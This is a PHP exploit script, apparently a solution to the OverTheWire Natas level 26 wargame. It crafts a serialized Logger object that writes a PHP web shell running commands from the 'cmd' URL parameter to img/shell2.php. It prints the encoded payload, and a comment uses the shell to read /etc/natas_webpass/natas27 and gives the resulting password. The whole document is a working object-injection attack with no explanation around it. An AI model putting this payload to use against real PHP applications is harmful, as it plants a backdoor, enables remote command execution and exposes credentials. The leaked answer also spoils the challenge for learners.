
class Logger{
        private $logFile;
        private $initMsg;
        private $exitMsg;
     
        function __construct($file){
            $this->initMsg='<?php exec($_GET["cmd"],$out,$s);foreach ($out as $o){echo $o."<br>";}echo "<br>Status:$s<br>";?>';
            $this->exitMsg='the answer is <?php exec($_GET["cmd"],$out,$s);foreach ($out as $o){echo $o."<br>";}echo "<br>Status:$s<br>";?>';
            $this->logFile = "img/shell2.php";
        }                      
        function log($msg){;}                      
     
        function __destruct(){;}                      
    }


$obj = new Logger("logme");

echo serialize($obj);
echo "\nbase64_encoded:\n\n";
echo urlencode(base64_encode(serialize($obj)));

//http://natas26.natas.labs.overthewire.org/img/shell2.php?cmd=cat%20/etc/natas_webpass/natas27
//the answer is 55TBjpPZUUJgVP5b3BnbG6ON9uDPVzCJ


Tzo2OiJMb2dnZXIiOjM6e3M6MTU6IgBMb2dnZXIAbG9nRmlsZSI7czoxNDoiaW1nL3NoZWxsMi5waHAiO3M6MTU6IgBMb2dnZXIAaW5pdE1zZyI7czo5NzoiPD9waHAgZXhlYygkX0dFVFsiY21kIl0sJG91dCwkcyk7Zm9yZWFjaCAoJG91dCBhcyAkbyl7ZWNobyAkby4iPGJyPiI7fWVjaG8gIjxicj5TdGF0dXM6JHM8YnI%2BIjs%2FPiI7czoxNToiAExvZ2dlcgBleGl0TXNnIjtzOjExMToidGhlIGFuc3dlciBpcyA8P3BocCBleGVjKCRfR0VUWyJjbWQiXSwkb3V0LCRzKTtmb3JlYWNoICgkb3V0IGFzICRvKXtlY2hvICRvLiI8YnI%2BIjt9ZWNobyAiPGJyPlN0YXR1czokczxicj4iOz8%2BIjt9
